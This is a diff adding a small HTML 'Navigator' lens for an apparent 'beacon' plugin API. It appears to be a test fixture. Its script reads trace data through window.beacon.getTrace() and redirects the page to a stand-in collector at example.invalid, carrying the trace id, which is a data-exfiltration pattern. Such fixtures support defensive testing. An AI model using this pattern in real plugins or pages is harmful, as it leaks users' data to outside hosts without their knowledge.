@@ -1,0 +1,15 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<script type="application/beacon-lens+json">{"id":"navigator","title":"Navigator","version":1,"api":"beacon.lens.v1"}</script>
+</head>
+<body>
+<p>leaving</p>
+<script>
+window.beacon.getTrace().then(function (data) {
+  location.href = "https://example.invalid/collect?d=" + encodeURIComponent(data.trace.id);
+});
+</script>
+</body>
+</html>
